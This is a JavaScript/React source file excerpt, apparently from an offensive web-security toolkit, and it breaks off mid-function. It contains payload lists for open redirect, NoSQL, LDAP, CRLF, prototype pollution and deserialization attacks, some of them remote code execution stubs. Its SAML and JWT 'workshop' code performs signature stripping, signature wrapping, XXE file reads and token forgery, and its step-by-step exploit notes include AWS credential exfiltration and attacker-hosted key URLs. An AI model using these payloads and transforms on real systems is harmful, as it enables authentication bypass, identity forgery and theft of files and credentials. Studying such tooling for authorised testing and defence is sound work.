      { label: 'At-sign bypass', value: '//trusted.com@evil.com' },
      { label: 'Subdomain bypass', value: 'https://evil.com.trusted.com' },
      { label: 'URL fragment bypass', value: 'https://trusted.com#https://evil.com' },
      { label: 'Path confusion', value: 'https://trusted.com/path/../../../evil.com' },
      { label: 'UNC path (Windows)', value: '\\\\evil.com\\share', platform: 'windows' },
      { label: 'file:// with UNC (Windows)', value: 'file://evil.com/share', platform: 'windows' },
    ],
  },
  {
    id: 'nosqli',
    label: 'NoSQLi',
    description: 'NoSQL Injection (MongoDB)',
    payloads: [
      { label: 'Auth bypass ($ne)', value: '{"username": {"$ne": null}, "password": {"$ne": null}}' },
      { label: 'Auth bypass ($gt)', value: '{"username": {"$gt": ""}, "password": {"$gt": ""}}' },
      { label: 'Auth bypass ($regex)', value: '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}' },
      { label: 'Operator in param', value: 'username[$ne]=invalid&password[$ne]=invalid' },
      { label: 'Gt operator in param', value: 'username[$gt]=&password[$gt]=' },
      { label: 'Where injection', value: '{"$where": "this.username == this.password"}' },
      { label: 'Array operator', value: '{"$in": ["admin", "root", "superuser"]}' },
      { label: 'Sleep blind', value: '{"$where": "sleep(5000) || 1==1"}' },
      { label: 'Exfil via regex', value: '{"$where": "this.password.match(/^a/)"}' },
    ],
  },
  {
    id: 'ldapi',
    label: 'LDAP Injection',
    description: 'LDAP Injection',
    payloads: [
      { label: 'Auth bypass (all)', value: '*)(uid=*))(|(uid=*' },
      { label: 'Auth bypass wildcard', value: '*' },
      { label: 'Auth bypass admin', value: 'admin)(&)' },
      { label: 'Filter injection', value: '*))(|(objectclass=*' },
      { label: 'Null bypass', value: 'admin\x00' },
      { label: 'OR inject', value: 'admin)(|(password=*)' },
      { label: 'Dump all users', value: '*))(|(uid=*' },
      { label: '[AD] sAMAccountName inject', value: '*)(sAMAccountName=*)(|(sAMAccountName=*' },
      { label: '[AD] Group membership dump', value: '*)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com' },
    ],
  },
  {
    id: 'crlf',
    label: 'CRLF',
    description: 'CRLF Injection & Header Injection',
    payloads: [
      { label: 'Basic CRLF', value: '%0d%0aHeader: injected' },
      { label: 'Set-Cookie', value: '%0d%0aSet-Cookie: session=evil' },
      { label: 'Content-Type XSS', value: '%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>' },
      { label: 'Response splitting', value: '%0d%0a%0d%0a<html>injected</html>' },
      { label: 'Log injection', value: '%0a%0dFake log entry' },
      { label: 'Location redirect', value: '%0d%0aLocation: https://evil.com' },
      { label: 'X-Forwarded-For spoof', value: '%0d%0aX-Forwarded-For: 127.0.0.1' },
    ],
  },
  {
    id: 'jwt',
    label: 'JWT',
    description: 'JWT Attack Workshop',
    payloads: [],
  },
  {
    id: 'proto',
    label: 'Prototype Pollution',
    description: 'JS Prototype Pollution',
    payloads: [
      { label: '__proto__ basic', value: '{"__proto__":{"isAdmin":true}}' },
      { label: 'constructor.prototype', value: '{"constructor":{"prototype":{"isAdmin":true}}}' },
      { label: 'URL param', value: '?__proto__[isAdmin]=true' },
      { label: 'Deep merge payload', value: '{"__proto__":{"polluted":"yes"}}' },
      { label: 'RCE via child_process (Linux)', value: '{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=attacker.com"}}', platform: 'linux' },
      { label: 'RCE via shell spawn (Linux)', value: '{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\'child_process\').execSync(\'id\').toString())//"}}', platform: 'linux' },
      { label: 'Template engine RCE', value: '{"__proto__":{"defaultSrc":["attacker.com"]}}' },
    ],
  },
  {
    id: 'deserialization',
    label: 'Deserialization',
    description: 'Insecure Deserialization',
    payloads: [
      { label: '[Java] ysoserial CommonsCollections1 (base64 stub)', value: 'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAALTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBz...' },
      { label: '[PHP] Basic object injection', value: 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}' },
      { label: '[PHP] Magic method trigger', value: 'O:8:"DateTime":1:{s:4:"date";s:29:"2023-01-01 00:00:00.000000";}' },
      { label: '[Python] Pickle RCE (base64)', value: 'gASVIAAAAAAAAACMCHN1YnByb2Nlc3OUjAVQb3BlbpSTlIwCaWSUhZRSlC4=' },
      { label: '[Node.js] serialize-javascript RCE', value: '_$$ND_FUNC$$_function(){return require("child_process").execSync("id").toString()}()' },
      { label: '[Ruby] Marshal RCE stub', value: '\x04\x08o:\x0bObject\x00' },
      { label: '[Java] SerialKiller bypass header', value: 'rO0AB...' },
      { label: '[.NET] BinaryFormatter stub', value: 'AAEAAAD/////AQAAAAAAAAA...' },
    ],
  },
  {
    id: 'saml',
    label: 'SAML',
    description: 'SAML Attack Workshop',
    payloads: [],
  },
];

// ─── SAML Workshop ────────────────────────────────────────────────────────────

function decodeSamlBase64(input) {
  try {
    let b64 = input.trim().replace(/\s+/g, '');
    try { b64 = decodeURIComponent(b64); } catch {}
    return atob(b64.replace(/\s+/g, ''));
  } catch {
    return null;
  }
}

function encodeSamlBase64(xml) {
  try {
    return btoa(unescape(encodeURIComponent(xml)));
  } catch {
    return btoa(xml);
  }
}

function prettifyXml(xml) {
  try {
    let result = '';
    let depth = 0;
    const parts = xml.replace(/></g, '>\n<').split('\n');
    for (const part of parts) {
      const t = part.trim();
      if (!t) continue;
      const isClose = /^<\//.test(t);
      const isSelfClose = /\/>$/.test(t);
      const isOpen = /^<[^/!?]/.test(t) && !isSelfClose;
      if (isClose) depth = Math.max(0, depth - 1);
      result += '  '.repeat(depth) + t + '\n';
      if (isOpen) depth++;
    }
    return result.trim();
  } catch {
    return xml;
  }
}

function samlStripSignatures(xml) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(xml, 'text/xml');
  const dsNs = 'http://www.w3.org/2000/09/xmldsig#';
  const sigs = [
    ...Array.from(doc.getElementsByTagNameNS(dsNs, 'Signature')),
    ...Array.from(doc.getElementsByTagName('ds:Signature')),
  ];
  const seen = new Set();
  sigs.forEach(s => {
    if (!seen.has(s) && s.parentNode) { s.parentNode.removeChild(s); seen.add(s); }
  });
  return new XMLSerializer().serializeToString(doc);
}

function samlInjectComment(xml) {
  return xml.replace(
    /(<(?:[a-zA-Z]+:)?NameID(?:\s[^>]*)?>)([^<]+)(<\/)/i,
    (_, open, val, close) => `${open}${val}<!---->${close}`
  );
}

function samlExtendTimestamps(xml, hours) {
  const ms = (parseInt(hours, 10) || 24) * 3600000;
  return xml.replace(
    /(NotBefore|NotOnOrAfter|IssueInstant|AuthnInstant|SessionNotOnOrAfter)="([^"]+)"/g,
    (match, attr, ds) => {
      try {
        const d = new Date(ds);
        if (isNaN(d)) return match;
        d.setTime(d.getTime() + ms);
        return `${attr}="${d.toISOString().replace(/\.\d{3}Z$/, 'Z')}"`;
      } catch { return match; }
    }
  );
}

function samlInjectXxe(xml, uri) {
  const dtd = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${uri || 'file:///etc/passwd'}">]>`;
  const withDecl = xml.includes('<?xml')
    ? xml.replace(/(<\?xml[^?]*\?>)(\s*)/, `$1\n${dtd}\n`)
    : `<?xml version="1.0" encoding="UTF-8"?>\n${dtd}\n${xml}`;
  return withDecl.replace(
    /(<(?:[a-zA-Z]+:)?NameID(?:\s[^>]*)?>)([^<]*?)(<\/)/i,
    (_, open, _val, close) => `${open}&xxe;${close}`
  );
}

function samlApplyXsw(xml, variant, evilNameId) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(xml, 'text/xml');
  const assertNs = 'urn:oasis:names:tc:SAML:2.0:assertion';
  const dsNs = 'http://www.w3.org/2000/09/xmldsig#';

  let assertion = doc.getElementsByTagNameNS(assertNs, 'Assertion')[0]
    || Array.from(doc.getElementsByTagName('*')).find(el => el.localName === 'Assertion');

  if (!assertion) return { error: 'No Assertion element found — decode a SAML response first' };

  const parent = assertion.parentNode;
  const ns = assertion.namespaceURI || assertNs;
  const prefix = assertion.prefix || 'saml';
  const evilId = '_xsw_' + Math.random().toString(36).slice(2, 10);

  if (variant === 'XSW1') {
    // Evil outer wraps legitimate signed inner
    const evil = doc.createElementNS(ns, `${prefix}:Assertion`);
    Array.from(assertion.attributes).forEach(a => {
      evil.setAttribute(a.name, a.name === 'ID' || a.name === 'Id' ? evilId : a.value);
    });
    const evilInner = assertion.cloneNode(true);
    // Modify NameID in evil inner clone
    const ni = evilInner.getElementsByTagNameNS(ns, 'NameID')[0]
      || Array.from(evilInner.getElementsByTagName('*')).find(e => e.localName === 'NameID');
    if (ni) ni.textContent = evilNameId || 'attacker@evil.com';
    // Remove sig from inner clone — sig stays on original
    [...Array.from(evilInner.getElementsByTagNameNS(dsNs, 'Signature')),
     ...Array.from(evilInner.getElementsByTagName('ds:Signature'))]
      .forEach(s => s.parentNode?.removeChild(s));
    parent.removeChild(assertion);
    evil.appendChild(evilInner);
    evil.appendChild(assertion);
    parent.appendChild(evil);

  } else if (variant === 'XSW2') {
    // Evil unsigned sibling inserted before signed assertion
    const evil = assertion.cloneNode(true);
    evil.setAttribute(assertion.hasAttribute('ID') ? 'ID' : 'Id', evilId);
    const ni = evil.getElementsByTagNameNS(ns, 'NameID')[0]
      || Array.from(evil.getElementsByTagName('*')).find(e => e.localName === 'NameID');
    if (ni) ni.textContent = evilNameId || 'attacker@evil.com';
    [...Array.from(evil.getElementsByTagNameNS(dsNs, 'Signature')),
     ...Array.from(evil.getElementsByTagName('ds:Signature'))]
      .forEach(s => s.parentNode?.removeChild(s));
    parent.insertBefore(evil, assertion);

  } else {
    return { error: `${variant}: edit XML manually above, then click Re-encode` };
  }

  return { xml: new XMLSerializer().serializeToString(doc) };
}

const SAML_ATTACKS = [
  {
    id: 'sig_strip',
    label: 'Sig Strip',
    description: 'Remove XML Signature — test if SP enforces signing',
    instructions: [
      'Many SPs accept unsigned assertions if signature enforcement is misconfigured',
      'Removes the entire <ds:Signature> block from both the Response and inner Assertion',
      'After stripping: edit the XML above (change NameID, role, email, groups freely)',
      'Re-submit — if SP accepts unsigned tokens, you control the asserted identity',
      'Burp extension SAML Raider has one-click "Remove Signatures"',
      'Also test: remove only the Response signature but keep Assertion signature (and vice versa)',
    ],
    fields: [],
    autoTransform: true,
  },
  {
    id: 'xsw',
    label: 'XSW',
    description: 'XML Signature Wrapping — valid sig on wrong element',
    instructions: [
      'Exploit: signature validates element A, but SP code processes element B',
      'XSW1 (auto): evil outer Assertion wraps legitimate signed inner — SP reads outer (unsigned, attacker-controlled)',
      'XSW2 (auto): evil unsigned sibling inserted before signed assertion — SP reads first match',
      'XSW3: evil Assertion nested as child of signed Assertion (use XML editor + Re-encode)',
      'XSW4: evil Assertion as child of signed Assertion, signature moved to sibling',
      'XSW5-8: advanced — signature appended to Response root, evil content in various positions',
      'For XSW3-8: manually reshape XML in editor, use SAML Raider for full automation',
      'Core insight: XPATH in signature reference selects by ID — parser may use different traversal',
    ],
    fields: [
      { key: 'xswVariant', label: 'Variant', type: 'select', options: ['XSW1', 'XSW2', 'XSW3 (manual)', 'XSW4 (manual)', 'XSW5 (manual)', 'XSW6 (manual)', 'XSW7 (manual)', 'XSW8 (manual)'] },
      { key: 'evilNameId', label: 'Attacker NameID / email', type: 'text', placeholder: 'attacker@evil.com' },
    ],
    autoTransform: true,
  },
  {
    id: 'comment_inject',
    label: 'Comment Inject',
    description: 'XML comment in NameID — XPATH sees different value than string parser',
    instructions: [
      'XML comments (<!---->) inside text nodes are ignored by XPATH but kept by string parsers',
      'Signature XPATH validates: "admin@company.com" (comments stripped)',
      'SP string-based parser sees: "admin@company.com<!---->evil.com" — may split on first part',
      'Result: signature validates legitimately, but SP authenticates you as "admin@company.com"',
      'CVE-2017-11427 (OneLogin), CVE-2017-11428 (OmniAuth), CVE-2017-11430 (Duo) all used this',
      'Variant: <NameID>admin<!---->.corp.com</NameID> — some parsers use text before comment',
      'After transform: verify NameID shows comment in XML editor, then craft/submit',
    ],
    fields: [],
    autoTransform: true,
  },
  {
    id: 'replay',
    label: 'Replay',
    description: 'Extend timestamps to replay captured or expired assertions',
    instructions: [
      'SAML validity defined by: IssueInstant, NotBefore, NotOnOrAfter, SessionNotOnOrAfter',
      'Captured valid assertion replayable until NotOnOrAfter — extend to make it valid indefinitely',
      'Note: SPs may check InResponseTo ID against a nonce table to prevent replay',
      'If replay protection enabled: change the Assertion ID and InResponseTo attributes manually',
      'Also change IssueInstant to "now" to avoid clock-skew rejection',
      'POST binding assertions are typically signed — timestamp change invalidates signature unless combined with Sig Strip',
      'Tip: capture assertion from an IdP-initiated SSO flow (no InResponseTo) for easier replay',
    ],
    fields: [
      { key: 'hoursToAdd', label: 'Hours to add to all timestamps', type: 'text', placeholder: '24' },
    ],
    autoTransform: true,
  },
  {
    id: 'xxe',
    label: 'XXE',
    description: 'XML External Entity injection — exfil files via SAML XML parser',
    instructions: [
      'SAML is XML — vulnerable parsers resolve external entity references in DOCTYPE',
      'Injects a DTD declaration + entity reference into the NameID value',
      'SP XML parser resolves &xxe; → reads the file → asserted identity becomes file contents',
      'Blind variant: use http://attacker.com/x — triggers OOB HTTP request for detection',
      'Useful targets: file:///etc/passwd, file:///etc/hostname, file:///proc/self/environ',
      'AWS credential exfil: file:///root/.aws/credentials or http://169.254.169.254/latest/meta-data/',
      'Most modern parsers (libxml2, Java SAX with XXE disabled) are not vulnerable — test first',
      'Burp Collaborator URL in entity URI gives OOB hit even when direct file read fails',
    ],
    fields: [
      { key: 'xxeUri', label: 'Entity URI', type: 'text', placeholder: 'file:///etc/passwd' },
    ],
    autoTransform: true,
  },
  {
    id: 'attribute_edit',
    label: 'Attr Edit',
    description: 'Directly modify assertion attributes and re-encode',
    instructions: [
      'Edit the XML above — change any value to escalate privilege or hijack identity',
      'Common targets: NameID (primary identity), email, role, groups, department',
      'Also modify: AudienceRestriction (must match SP entity ID), InResponseTo, SessionIndex',
      'Timestamp fields: set IssueInstant/NotBefore to now, NotOnOrAfter to far future',
      'If SP verifies signature → combine with Sig Strip first',
      'Some SPs only verify the outer Response signature, not the inner Assertion — test separately',
      'Click "Re-encode" to base64 the current XML without any automated transform',
    ],
    fields: [],
    autoTransform: false,
  },
  {
    id: 'namespace_confusion',
    label: 'Namespace',
    description: 'Namespace prefix manipulation to bypass signature canonicalization',
    instructions: [
      'XML canonicalization (C14N) is namespace-aware — parser and validator may disagree',
      'Try: rename saml: prefix to saml2: on the evil element — signature may not cover renamed form',
      'Add unused namespace declaration on wrapper element: xmlns:evil="urn:x" — may affect C14N',
      'XSLT transform attack: some SPs apply XSLT from the signature Transforms — inject malicious XSLT',
      'Pattern: add xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" + xsi:type on NameID element',
      'Exploit: validator uses exclusive C14N, parser uses inclusive C14N — different text derived',
      'Edit XML manually above, then click "Re-encode" to output crafted SAML',
      'SAML Raider "SAML Attribute" tab automates namespace-based confusion attacks',
    ],
    fields: [],
    autoTransform: false,
  },
];

function SAMLWorkshop() {
  const [rawSaml, setRawSaml] = useState('');
  const [xmlEditor, setXmlEditor] = useState('');
  const [activeAttack, setActiveAttack] = useState(SAML_ATTACKS[0].id);
  const [params, setParams] = useState({});
  const [output, setOutput] = useState('');
  const [decodeError, setDecodeError] = useState('');
  const [transformError, setTransformError] = useState('');

  function handleDecode() {
    const trimmed = rawSaml.trim();
    if (!trimmed) return;
    let b64 = trimmed;
    if (trimmed.includes('SAMLResponse=') || trimmed.includes('SAMLRequest=')) {
      try {
        const qs = trimmed.includes('://') ? new URL(trimmed).search.slice(1) : trimmed;
        const p = new URLSearchParams(qs);
        b64 = p.get('SAMLResponse') || p.get('SAMLRequest') || b64;
      } catch {}
    }
    const decoded = decodeSamlBase64(b64);
    if (!decoded || !decoded.trim().startsWith('<')) {
      setDecodeError('Decode failed — paste raw base64 SAML or a SAMLResponse=... query string');
      return;
    }
    setDecodeError('');
    setXmlEditor(prettifyXml(decoded));
  }

  function setParam(key, val) {
    setParams(p => ({ ...p, [key]: val }));
  }

  function handleTransform() {
    const xml = xmlEditor.trim();
    if (!xml) { toast.error('No XML to transform'); return; }
    setTransformError('');

    let result = xml;

    if (activeAttack === 'sig_strip') {
      result = samlStripSignatures(xml);
    } else if (activeAttack === 'comment_inject') {
      result = samlInjectComment(xml);
    } else if (activeAttack === 'replay') {
      result = samlExtendTimestamps(xml, params.hoursToAdd);
    } else if (activeAttack === 'xxe') {
      result = samlInjectXxe(xml, params.xxeUri);
    } else if (activeAttack === 'xsw') {
      const variant = params.xswVariant || 'XSW1';
      if (variant.includes('manual')) {
        toast('Edit XML manually above, then click Re-encode');
      } else {
        const r = samlApplyXsw(xml, variant, params.evilNameId);
        if (r.error) { setTransformError(r.error); return; }
        result = r.xml;
      }
    }
    // attribute_edit + namespace_confusion: just re-encode as-is

    setXmlEditor(prettifyXml(result));
    setOutput(encodeSamlBase64(result));
  }

  function handleReencode() {
    const xml = xmlEditor.trim();
    if (!xml) { toast.error('No XML to encode'); return; }
    setOutput(encodeSamlBase64(xml));
  }

  const attack = SAML_ATTACKS.find(a => a.id === activeAttack);
  const isManualOnly = activeAttack === 'attribute_edit' || activeAttack === 'namespace_confusion';

  return (
    <div className="space-y-4">
      {/* Decode input */}
      <div className="card p-4 space-y-3">
        <p className="text-xs font-medium text-text-secondary">Paste SAML assertion/response (base64) or SAMLResponse= query string</p>
        <div className="flex gap-2">
          <input
            type="text"
            value={rawSaml}
            onChange={e => setRawSaml(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && handleDecode()}
            placeholder="PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6..."
            className="input flex-1 text-xs font-mono"
          />
          <button onClick={handleDecode} className="btn-ghost text-xs px-4 shrink-0">Decode</button>
        </div>
        {decodeError && <p className="text-xs text-red-400">{decodeError}</p>}
        <div>
          <p className="text-2xs text-text-muted mb-1 font-medium">XML (editable)</p>
          <textarea
            value={xmlEditor}
            onChange={e => setXmlEditor(e.target.value)}
            placeholder={'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>\n  ...\n</samlp:Response>'}
            className="input w-full text-xs font-mono resize-y leading-relaxed"
            rows={14}
            spellCheck={false}
          />
        </div>
        <button
          onClick={handleReencode}
          className="btn-ghost text-xs flex items-center gap-1.5"
        >
          <Copy className="w-3.5 h-3.5" /> Re-encode XML → base64
        </button>
      </div>

      {/* Attack tabs */}
      <div className="flex gap-1 flex-wrap">
        {SAML_ATTACKS.map(a => (
          <button
            key={a.id}
            onClick={() => setActiveAttack(a.id)}
            className={`px-3 py-1.5 rounded text-xs font-medium transition-colors ${
              activeAttack === a.id
                ? 'bg-accent/15 text-accent border border-accent/30'
                : 'text-text-muted hover:text-text-primary hover:bg-white/5 border border-transparent'
            }`}
          >
            {a.label}
          </button>
        ))}
      </div>

      {/* Attack panel */}
      {attack && (
        <div className="card p-4 space-y-4">
          <div>
            <p className="text-sm font-semibold text-text-primary">{attack.label}</p>
            <p className="text-xs text-text-muted mt-0.5">{attack.description}</p>
          </div>

          <div className="space-y-2">
            <p className="text-2xs font-medium text-text-muted uppercase tracking-wider">How to exploit</p>
            <ol className="space-y-1.5">
              {attack.instructions.map((step, i) => (
                <li key={i} className="flex gap-2.5 text-xs text-text-secondary">
                  <span className="text-accent font-mono shrink-0 mt-0.5">{i + 1}.</span>
                  <span className="leading-relaxed">{step}</span>
                </li>
              ))}
            </ol>
          </div>

          {attack.fields && attack.fields.length > 0 && (
            <div className="space-y-3 pt-1 border-t border-border">
              <p className="text-2xs font-medium text-text-muted uppercase tracking-wider pt-1">Parameters</p>
              {attack.fields.map(field => (
                <div key={field.key}>
                  <label className="text-2xs text-text-secondary block mb-1">{field.label}</label>
                  {field.type === 'select' ? (
                    <select
                      value={params[field.key] ?? field.options[0]}
                      onChange={e => setParam(field.key, e.target.value)}
                      className="input text-xs py-1.5 w-auto"
                    >
                      {field.options.map(opt => <option key={opt} value={opt}>{opt}</option>)}
                    </select>
                  ) : (
                    <input
                      type="text"
                      value={params[field.key] || ''}
                      onChange={e => setParam(field.key, e.target.value)}
                      placeholder={field.placeholder}
                      className="input w-full text-xs font-mono"
                    />
                  )}
                </div>
              ))}
            </div>
          )}

          {transformError && <p className="text-xs text-red-400">{transformError}</p>}

          <button
            onClick={handleTransform}
            className="btn-ghost text-xs flex items-center gap-1.5"
          >
            <Crosshair className="w-3.5 h-3.5" />
            {isManualOnly ? 'Re-encode XML' : 'Apply Transform + Encode'}
          </button>
        </div>
      )}

      {/* Output */}
      {output && (
        <div className="card p-4 space-y-3">
          <div className="flex items-center justify-between">
            <p className="text-xs font-medium text-text-secondary">Encoded SAML (POST binding base64)</p>
            <div className="flex gap-2">
              <button
                onClick={() => copyToClipboard(output, 'SAML base64')}
                className="flex items-center gap-1 px-2 py-1 rounded text-xs bg-accent/10 text-accent hover:bg-accent/20 transition-colors"
              >
                <Copy className="w-3 h-3" /> Copy
              </button>
              <button
                onClick={() => copyToClipboard(`SAMLResponse=${encodeURIComponent(output)}`, 'SAMLResponse param')}
                className="flex items-center gap-1 px-2 py-1 rounded text-xs bg-white/5 text-text-secondary hover:bg-white/10 transition-colors"
              >
                <Copy className="w-3 h-3" /> As SAMLResponse=
              </button>
            </div>
          </div>
          <code className="block text-xs font-mono text-text-primary break-all whitespace-pre-wrap leading-relaxed bg-white/[0.03] p-3 rounded-lg border border-border">
            {output}
          </code>
        </div>
      )}
    </div>
  );
}

// ─── JWT Workshop ─────────────────────────────────────────────────────────────

function b64urlEncode(str) {
  return btoa(unescape(encodeURIComponent(str)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function b64urlDecode(str) {
  try {
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    while (str.length % 4) str += '=';
    return decodeURIComponent(escape(atob(str)));
  } catch {
    return null;
  }
}

function parseJwt(token) {
  const parts = token.trim().split('.');
  if (parts.length < 2) return null;
  const header = b64urlDecode(parts[0]);
  const payload = b64urlDecode(parts[1]);
  if (!header || !payload) return null;
  try {
    return { header: JSON.parse(header), payload: JSON.parse(payload), sig: parts[2] || '' };
  } catch {
    return null;
  }
}

async function hmacSign(headerB64, payloadB64, secret) {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
  );
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(`${headerB64}.${payloadB64}`));
  return btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

const JWT_ATTACKS = [
  {
    id: 'alg_none',
    label: 'alg: none',
    description: 'Unsigned token — bypass signature verification',
    instructions: [
      'Server must accept unsigned tokens or fail to validate the alg field',
      'Set alg to "none" — server skips HMAC/RSA verification entirely',
      'Try case variants if "none" is blocklisted: None, NONE, nOnE, NonE',
      'Edit payload claims freely (role, admin, sub, exp, iat)',
      'Crafted token ends with a trailing dot and NO signature',
      'Send: Authorization: Bearer <header>.<payload>.',
    ],
    fields: [
      { key: 'algVariant', label: 'alg variant', type: 'select', options: ['none', 'None', 'NONE', 'nOnE', 'NonE', 'NoNe', 'NONE '] },
    ],
  },
  {
    id: 'alg_confusion',
    label: 'RS256 → HS256',
    description: 'Algorithm confusion — sign with RSA public key as HMAC secret',
    instructions: [
      'Target: server uses RS256 but does not enforce the alg field on incoming tokens',
      'Vulnerable code pattern: jwt.verify(token, publicKey) — if alg=HS256, publicKey is used as HMAC secret',
      'Obtain the server RSA public key from /jwks.json, /.well-known/openid-configuration, or error disclosure',
      'Change header alg to HS256',
      'HMAC-SHA256 sign the token using the PEM public key string as the HMAC secret',
      'Server verifies with jwt.verify(token, publicKey) → treats RSA pubkey as HMAC key → matches',
      'Tip: try both with and without stripping PEM headers if verification fails',
    ],
    fields: [
      { key: 'publicKey', label: 'RSA Public Key (PEM)', type: 'textarea', placeholder: '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...\n-----END PUBLIC KEY-----' },
    ],
  },
  {
    id: 'weak_secret',
    label: 'Weak Secret',
    description: 'Re-sign with known or guessed HS256 secret',
    instructions: [
      'Target: HS256/HS384/HS512 JWT signed with a weak or default secret',
      'Crack first with hashcat: hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt',
      'Or jwt_tool: python3 jwt_tool.py <token> -C -d wordlist.txt',
      'Common defaults to try: secret, password, 123456, changeme, <app name>, <company name>',
      'Once secret is known, modify any payload claims and re-sign with the same secret',
      'Server verifies the HMAC → passes as if legitimate',
    ],
    fields: [
      { key: 'secret', label: 'HMAC Secret', type: 'text', placeholder: 'secret' },
    ],
  },
  {
    id: 'kid_sqli',
    label: 'kid SQLi',
    description: 'SQL injection via kid header field',
    instructions: [
      'kid (Key ID) header used to look up signing key: SELECT key FROM keys WHERE kid = \'<kid>\'',
      'Inject a UNION to return an attacker-controlled string as the key value',
      'Set kid to: x\' UNION SELECT \'attackerkey\'-- (adapt column count for target DB)',
      'Sign the token with HS256 using that same string ("attackerkey") as the secret',
      'Server executes injected query → gets "attackerkey" → verifies HMAC → passes',
      'Also try error-based or blind variants if UNION blocked',
    ],
    fields: [
      { key: 'kidValue', label: 'kid value (injected)', type: 'text', placeholder: "x' UNION SELECT 'attackerkey'--" },
      { key: 'secret', label: 'Signing secret (must match injected key return)', type: 'text', placeholder: 'attackerkey' },
    ],
  },
  {
    id: 'kid_traversal',
    label: 'kid Traversal',
    description: 'Path traversal via kid to force a known key value',
    instructions: [
      'kid used as a filename: fs.readFileSync("./keys/" + kid) or open(kid)',
      'Linux: set kid to ../../dev/null — reads empty file → signing key = empty string ""',
      'Sign token with HS256 using "" (empty string) as secret',
      'Windows: try ../../Windows/win.ini or point to NUL device equivalent',
      'Or traverse to any file you can write to (e.g., uploaded avatar) → sign with that file\'s contents',
      'Combine with other vulns: write a file via XXE/SSRF/LFI then reference it via kid',
    ],
    fields: [
      { key: 'kidValue', label: 'kid path', type: 'text', placeholder: '../../dev/null' },
      { key: 'secret', label: 'Secret (contents of target file, empty for /dev/null)', type: 'text', placeholder: '' },
    ],
  },
  {
    id: 'jku_inject',
    label: 'jku Injection',
    description: 'Redirect JWKS fetch to attacker-controlled server',
    instructions: [
      'jku header = URL the server fetches to retrieve public keys (JSON Web Key Set)',
      'Vulnerable servers fetch this URL at verification time without validating the domain',
      'Host your JWKS at attacker.com/jwks.json with your RS256 public key',
      'JWKS format: {"keys":[{"kty":"RSA","kid":"attacker","use":"sig","n":"<modulus>","e":"AQAB"}]}',
      'Change jku to https://attacker.com/jwks.json and set kid to match your JWKS entry',
      'Sign token with your RS256 private key',
      'Server fetches your JWKS → extracts your public key → verifies your signature → passes',
      'Generate keypair: openssl genrsa -out priv.pem 2048 && openssl rsa -in priv.pem -pubout -out pub.pem',
    ],
    fields: [
      { key: 'jkuUrl', label: 'jku URL (your JWKS endpoint)', type: 'text', placeholder: 'https://attacker.com/jwks.json' },
      { key: 'kid', label: 'kid (must match your JWKS)', type: 'text', placeholder: 'attacker' },
    ],
  },
  {
    id: 'x5u_inject',
    label: 'x5u Injection',
    description: 'Redirect X.509 cert fetch to attacker-controlled server',
    instructions: [
      'x5u header = URL pointing to an X.509 certificate chain for signature verification',
      'Server fetches cert at verification time — redirect to your self-signed cert',
      'Generate cert + key: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes',
      'Host cert.pem at https://attacker.com/cert.pem',
      'Change x5u to your URL in the JWT header',
      'Sign token with key.pem (the private key matching your cert)',
      'Server fetches cert → extracts public key → verifies your signature → passes',
    ],
    fields: [
      { key: 'x5uUrl', label: 'x5u URL (your cert endpoint)', type: 'text', placeholder: 'https://attacker.com/cert.pem' },
    ],
  },
  {
    id: 'embedded_jwk',
    label: 'Embedded JWK',
    description: 'Inject attacker public key directly into jwk header',
    instructions: [
      'jwk header field can embed a public key inline — vulnerable servers use it to verify',
      'Vulnerable code: const key = jwt.header.jwk; jwt.verify(token, key) — trusts attacker-supplied key',
      'Generate an RS256 keypair (see openssl command under jku Injection)',
      'Export your public key as a JWK object: {"kty":"RSA","n":"<b64url modulus>","e":"AQAB"}',
      'Embed it in the JWT header as the "jwk" field',
      'Sign the token with your private key',
      'Server reads embedded jwk → uses it to verify → your signature validates → passes',
      'jwt_tool shortcut: python3 jwt_tool.py <token> -X s',
    ],
    fields: [
      { key: 'jwkJson', label: 'JWK (your public key as JSON)', type: 'textarea', placeholder: '{"kty":"RSA","n":"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2...","e":"AQAB"}' },
    ],
  },
];

function JWTWorkshop() {
  const [rawJwt, setRawJwt] = useState('');
  const [headerJson, setHeaderJson] = useState('{\n  "alg": "HS256",\n  "typ": "JWT"\n}');
  const [payloadJson, setPayloadJson] = useState('{\n  "sub": "1234567890",\n  "name": "user",\n  "admin": false,\n  "iat": 1516239022\n}');
  const [activeAttack, setActiveAttack] = useState(JWT_ATTACKS[0].id);
  const [params, setParams] = useState({});
  const [output, setOutput] = useState('');
  const [parseError, setParseError] = useState('');
  const [crafting, setCrafting] = useState(false);

  function handleDecode() {
    const trimmed = rawJwt.trim();
    if (!trimmed) return;
    const parsed = parseJwt(trimmed);
    if (!parsed) { setParseError('Invalid JWT — check format'); return; }
    setParseError('');
    setHeaderJson(JSON.stringify(parsed.header, null, 2));
